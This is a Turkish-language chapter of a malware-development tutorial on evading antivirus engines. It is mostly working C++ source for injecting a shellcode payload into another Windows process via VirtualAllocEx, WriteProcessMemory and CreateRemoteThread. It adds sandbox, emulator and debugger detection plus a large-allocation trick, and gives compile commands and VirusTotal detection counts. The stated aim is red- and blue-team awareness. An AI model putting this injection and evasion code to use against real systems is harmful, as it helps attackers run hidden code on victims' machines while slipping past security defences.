\newpage
\subsection{56. AV motorlarından kaçınma teknikleri - bölüm 3. Basit C++ örneği.}

﷽

![av](./images/34/2021-12-26_16-05.png){width="80%"}    

Bu, eğitimin üçüncü bölümü olup, basit bir C++ malware ile AV motorlarını nasıl atlatabileceğinize dair bir örneği açıklamaktadır.     

[1 - bölüm](https://cocomelonc.github.io/tutorial/2021/09/04/simple-malware-av-evasion.html)    
[2 - bölüm](https://cocomelonc.github.io/tutorial/2021/09/06/simple-malware-av-evasion-2.html)    

Bu bölümde, kötü amaçlı yazılımlar tarafından kullanılan bazı teknikleri uygulamaya çalışacağız; bunlar kod yürütme ve savunmalardan gizlenme yöntemleridir.     

[Klasik kod enjeksiyonunu](https://cocomelonc.github.io/tutorial/2021/09/18/malware-injection-1.html) uygulayan kötü amaçlı yazılımımızın C++ kaynak kodu örneğine bir göz atalım:    

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

int main(int argc, char* argv[]) {

  // 64-bit meow-meow messagebox without encryption
  unsigned char my_payload[] =
    "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
    "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
    "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
    "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
    "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
    "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
    "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
    "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
    "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
    "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
    "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
    "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
    "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
    "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
    "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
    "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
    "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
    "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
    "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
    "\x2e\x2e\x5e\x3d\x00";

  HANDLE ph; // process handle
  HANDLE rt; // remote thread
  PVOID rb; // remote buffer

  // parse process ID
  printf("PID: %i", atoi(argv[1]));
  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 
  DWORD(atoi(argv[1])));

  // allocate memory buffer for remote process
  rb = VirtualAllocEx(ph, NULL, sizeof(my_payload), 
  (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

  // "copy" data between processes
  WriteProcessMemory(ph, rb, my_payload, 
  sizeof(my_payload), NULL);

  // our process start new thread
  rt = CreateRemoteThread(ph, NULL, 0, 
  (LPTHREAD_START_ROUTINE)rb, 
  NULL, 0, NULL);
  CloseHandle(ph);
  return 0;
}

```

Bu klasik bir varyanttır; payload'u tanımlarız, belleği tahsis ederiz, yeni buffera kopyalarız ve ardından yürütürüz.    

AV tarayıcılarının en büyük sınırlamalarından biri, her dosya üzerinde harcayabilecekleri süredir.    

Normal bir sistem taraması sırasında, AV binlerce dosyayı analiz etmek zorundadır. Tek bir dosya için fazla zaman veya işlem gücü harcayamaz.Payload şifrelemeye ek olarak kullanılan "klasik" AV atlatma tekniklerinden biri: Basitçe `100MB` bellek ayırıp doldurmaktır.    

```cpp
char *mem = NULL;
mem = (char *) malloc(100000000);
if (mem != NULL) {
  memset(mem, 00, 100000000);
  free(mem);
  //... run our malicious logic
}
```

O halde, basit malware kodumuzu güncelleyelim:    

```cpp
/*
hack.cpp
classic payload injection example
allocate too much memory
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2021/12/21/simple-malware-av-evasion-3.html
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

int main(int argc, char* argv[]) {

  // meow-meow messagebox x64 windows
  unsigned char my_payload[] =
    "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
    "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
    "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
    "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
    "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
    "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
    "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
    "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
    "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
    "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
    "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
    "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
    "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
    "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
    "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
    "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
    "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
    "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
    "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
    "\x2e\x2e\x5e\x3d\x00";

  HANDLE ph; // process handle
  HANDLE rt; // remote thread
  PVOID rb; // remote buffer

  DWORD pid; // process ID
  pid = atoi(argv[1]);

  // allocate and fill 100 MB of memory
  char *mem = NULL;
  mem = (char *) malloc(100000000);

  if (mem != NULL) {
    memset(mem, 00, 100000000);
    free(mem);

    // parse process ID
    ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 
    DWORD(pid));
    printf("PID: %i", pid);

    // allocate memory buffer for remote process
    rb = VirtualAllocEx(ph, NULL, sizeof(my_payload), 
    (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

    // "copy" data between processes
    WriteProcessMemory(ph, rb, my_payload, 
    sizeof(my_payload), NULL);

    // our process start new thread
    rt = CreateRemoteThread(ph, NULL, 0, 
    (LPTHREAD_START_ROUTINE)rb, 
    NULL, 0, NULL);
    CloseHandle(ph);
    return 0;
  }
}
```

Haydi derleyelim:    

```bash
x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fdata-sections \
-Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

![av 2](./images/34/2021-12-26_16-41.png){width="80%"}    

Ve bunu kurbanın makinesinde (`Windows 10 x64`) çalıştıralım:     

![av 2.1](./images/34/2021-12-26_16-46.png){width="80%"}   

Gördüğünüz gibi her şey mükemmel çalıştı :)     

Ve eğer bu zararlı yazılımı sadece VirusTotal'e yüklersek:    

![av 3](./images/34/2021-12-25_14-35.png){width="80%"}    

[https://www.virustotal.com/gui/file/4ff68b6ca99638342b9b316439594c21520e66feca36c2447e3cc75ad3d70f46/detection](https://www.virustotal.com/gui/file/4ff68b6ca99638342b9b316439594c21520e66feca36c2447e3cc75ad3d70f46/detection)    

**Bu yüzden, 67 antivirüs motorundan sadece 6’sı dosyamızı zararlı olarak tespit etti.**

Daha iyi bir sonuç almak için, payload [şifrelemesi](https://cocomelonc.github.io/tutorial/2021/09/04/simple-malware-av-evasion.html) ekleyebilir, [fonksiyonları gizleyebilir](https://cocomelonc.github.io/tutorial/2021/09/06/simple-malware-av-evasion-2.html) veya her iki tekniği birleştirebiliriz.    

Peki sırada ne var? Zararlı yazılımlar genellikle çalıştıkları ortamı analiz etmek ve duruma göre farklı aksiyonlar almak için çeşitli yöntemler kullanır.   

Örneğin, sanallaştırılmış bir ortamı tespit edebiliriz. Sandbox'lar ve analiz amaçlı sanal makineler gerçek bir çalışma ortamını %100 doğru şekilde taklit edemez.    

Günümüzde tipik bir kullanıcı bilgisayarı en az 2 çekirdekli bir işlemciye ve minimum 2GB RAM'e sahiptir.Bu yüzden, zararlı yazılımımız çalıştığı ortamın bu kriterlere uyup uymadığını doğrulayabilir:    

```cpp
BOOL checkResources() {
  SYSTEM_INFO s;
  MEMORYSTATUSEX ms;
  DWORD procNum;
  DWORD ram;

  // check number of processors
  GetSystemInfo(&s);
  procNum = s.dwNumberOfProcessors;
  if (procNum < 2) return false;

  // check RAM
  ms.dwLength = sizeof(ms);
  GlobalMemoryStatusEx(&ms);
  ram = ms.ullTotalPhys / 1024 / 1024 / 1024;
  if (ram < 2) return false;

  return true;
}
```

Ayrıca, `VirtualAllocExNuma()` API çağrısını kullanacağız. Bu, `VirtualAllocEx()`'in alternatif bir versiyonudur ve birden fazla fiziksel işlemcisi olan sistemlerde kullanılmak üzere tasarlanmıştır:     

```cpp
typedef LPVOID (WINAPI * pVirtualAllocExNuma) (
  HANDLE         hProcess,
  LPVOID         lpAddress,
  SIZE_T         dwSize,
  DWORD          flAllocationType,
  DWORD          flProtect,
  DWORD          nndPreferred
);

// memory allocation work on regular PC 
// but will fail in AV emulators
BOOL checkNUMA() {
  LPVOID mem = NULL;
  pVirtualAllocExNuma myVirtualAllocExNuma = 
  (pVirtualAllocExNuma)GetProcAddress(
  GetModuleHandle("kernel32.dll"), "VirtualAllocExNuma");
  mem = myVirtualAllocExNuma(GetCurrentProcess(), 
  NULL, 1000, MEM_RESERVE | MEM_COMMIT, 
  PAGE_EXECUTE_READWRITE, 0);
  if (mem != NULL) {
    return false;
  } else {
    return true;
  }
}

//...
```


Burada yaptığımız şey, `VirtualAllocExNuma()` ile bellek ayırmaya çalışmaktır. Eğer başarısız olursa, hemen çıkış yapıyoruz. Aksi takdirde, yürütme devam edecektir.     

Kod öykünme altında çalıştırıldığında, genellikle yürütülen işlemin adı, binary dosyasının adıyla eşleşmez. Bu yüzden, ilk argümanın dosya adını içerip içermediğini kontrol ediyoruz:    

```cpp
// what is my name???
if (strstr(argv[0], "hack2.exe") == NULL) {
  printf("What's my name? WTF?? :(\n");
  return -2;
}
```

İşletim sistemine basitçe bir debugger'ın ekli olup olmadığını "sormak" mümkündür.`IsDebuggerPresent` fonksiyonu, `PEB` (Process Environment Block) içindeki `BeingDebugged` bayrağını kontrol eder:    

```cpp
// "ask" the OS if any debugger is present
if (IsDebuggerPresent()) {
  printf("attached debugger detected :(\n");
  return -2;
}
```

Dinamik zararlı yazılım analizi - veya sandboxing - günümüzde büyük güvenlik çözümlerinin merkezinde yer almaktadır. Aynı zamanda, günümüzdeki tehditlerin neredeyse tüm varyantları bir tür sandbox tespit mantığı içermektedir.    

Bu nedenle, tüm bu teknikleri birleştirmeyi deneyebiliriz (`hack2.cpp`):   

```cpp
/*
hack.cpp
classic payload injection example
allocate too much memory
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2021/12/21/simple-malware-av-evasion-3.html
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <memoryapi.h>

typedef LPVOID (WINAPI * pVirtualAllocExNuma) (
  HANDLE         hProcess,
  LPVOID         lpAddress,
  SIZE_T         dwSize,
  DWORD          flAllocationType,
  DWORD          flProtect,
  DWORD          nndPreferred
);

// memory allocation work on regular PC 
// but will fail in AV emulators
BOOL checkNUMA() {
  LPVOID mem = NULL;
  pVirtualAllocExNuma myVirtualAllocExNuma = 
  (pVirtualAllocExNuma)GetProcAddress(
  GetModuleHandle("kernel32.dll"), 
  "VirtualAllocExNuma");
  mem = myVirtualAllocExNuma(GetCurrentProcess(), 
  NULL, 1000, MEM_RESERVE | MEM_COMMIT, 
  PAGE_EXECUTE_READWRITE, 0);
  if (mem != NULL) {
    return false;
  } else {
    return true;
  }
}

// resource check
BOOL checkResources() {
  SYSTEM_INFO s;
  MEMORYSTATUSEX ms;
  DWORD procNum;
  DWORD ram;

  // check number of processors
  GetSystemInfo(&s);
  procNum = s.dwNumberOfProcessors;
  if (procNum < 2) return false;

  // check RAM
  ms.dwLength = sizeof(ms);
  GlobalMemoryStatusEx(&ms);
  ram = ms.ullTotalPhys / 1024 / 1024 / 1024;
  if (ram < 2) return false;

  return true;
}

int main(int argc, char* argv[]) {

  // meow-meow messagebox x64 windows
  unsigned char my_payload[] =
    "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
    "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
    "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
    "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
    "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
    "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
    "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
    "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
    "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
    "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
    "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
    "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
    "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
    "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
    "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
    "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
    "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
    "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
    "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
    "\x2e\x2e\x5e\x3d\x00";

  HANDLE ph; // process handle
  HANDLE rt; // remote thread
  PVOID rb; // remote buffer

  DWORD pid; // process ID
  pid = atoi(argv[1]);

  // what is my name???
  if (strstr(argv[0], "hack2.exe") == NULL) {
    printf("What's my name? WTF?? :(\n");
    return -2;
  }

  // "ask" the OS if any debugger is present
  if (IsDebuggerPresent()) {
    printf("attached debugger detected :(\n");
    return -2;
  }

  // check NUMA
  if (checkNUMA()) {
    printf("NUMA memory allocate failed :( \n");
    return -2;
  }

  // check resources
  if (checkResources() == false) {
    printf("possibly launched in sandbox :(\n");
    return -2;
  }

  // allocate and fill 100 MB of memory
  char *mem = NULL;
  mem = (char *) malloc(100000000);

  if (mem != NULL) {
    memset(mem, 00, 100000000);
    free(mem);

    // parse process ID
    ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 
    DWORD(pid));
    printf("PID: %i", pid);

    // allocate memory buffer for remote process
    rb = VirtualAllocEx(ph, NULL, sizeof(my_payload), 
    (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

    // "copy" data between processes
    WriteProcessMemory(ph, rb, my_payload, 
    sizeof(my_payload), NULL);

    // our process start new thread
    rt = CreateRemoteThread(ph, NULL, 0, 
    (LPTHREAD_START_ROUTINE)rb, 
    NULL, 0, NULL);
    CloseHandle(ph);
    return 0;
  }
}
```

Haydi derleyelim:    

![av 4](./images/34/2021-12-26_18-55.png){width="80%"}    

Ve bunu kurbanımızın makinesinde (`Windows 10 x64`) çalıştıralım:    

![av 5](./images/34/2021-12-26_18-57.png){width="80%"}   

Gördüğünüz gibi, kötü amaçlı mantığımız başlamadı çünkü 1 çekirdekli bir sanal makinedeyiz.    

Şimdi bu varyantı VirusTotal'a yükleyelim:    

![av 6](./images/34/2021-12-26_19-02.png){width="80%"}   

[https://www.virustotal.com/gui/file/5658fd8d326dcbb01492c0d5644cdeb69dc8d64acbf939a91b25a3caa53f7a61/detection](https://www.virustotal.com/gui/file/5658fd8d326dcbb01492c0d5644cdeb69dc8d64acbf939a91b25a3caa53f7a61/detection)

**Yani, 8/67 antivirüs motoru dosyamızı kötü amaçlı olarak algıladı.**

Her zamanki gibi, daha iyi sonuç almak için [payload şifrelemesi](https://cocomelonc.github.io/tutorial/2021/09/04/simple-malware-av-evasion.html) ekleyebilir, [fonksiyonları gizleyebilir](https://cocomelonc.github.io/tutorial/2021/09/06/simple-malware-av-evasion-2.html) veya her iki tekniği birleştirebiliriz.    

Sonuç olarak, antivirüslerin zayıf noktalarından yararlanarak onları atlatmanın oldukça basit olduğunu gösteren birkaç örnek sunduk. Bunun için sadece Windows sistemleri ve antivirüslerin nasıl çalıştığı hakkında bilgi sahibi olmak yeterlidir.    

Ayrıca, cihazları ve üretici adlarını tespit etmek, sanal makineye özgü izleri aramak, dosya, işlem veya pencere adlarını kontrol etmek, ekran çözünürlüğünü doğrulamak gibi yöntemler de denenebilir.Bu teknikleri ve gerçek dünya örneklerini gelecekteki yazılarımda paylaşacağım.    

Umarım bu bölüm, blue team'ler için farkındalık oluşturur ve red team'lerin cephaneliğine yeni bir silah ekler.    

[The Antivirus Hacker's Handbook](https://www.amazon.com/Antivirus-Hackers-Handbook-Joxean-Koret/dp/1119028752)    
[Wikileaks - Bypass AV Dynamic Analysis](https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf)    
[DeepSec 2013 Talk: The Joys of Detecting Malicious Software](https://blog.deepsec.net/deepsec-2013-talk-easy-ways-to-bypass-anti-virus-systems/)    
[IsDebuggerPresent](https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-isdebuggerpresent)    
[VirtualAllocExNuma](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocexnuma)    
[NUMA Support](https://docs.microsoft.com/en-us/windows/win32/procthread/numa-support)    
[Github'taki kaynak kod](https://github.com/cocomelonc/2021-12-21-simple-malware-av-evasion-3)    
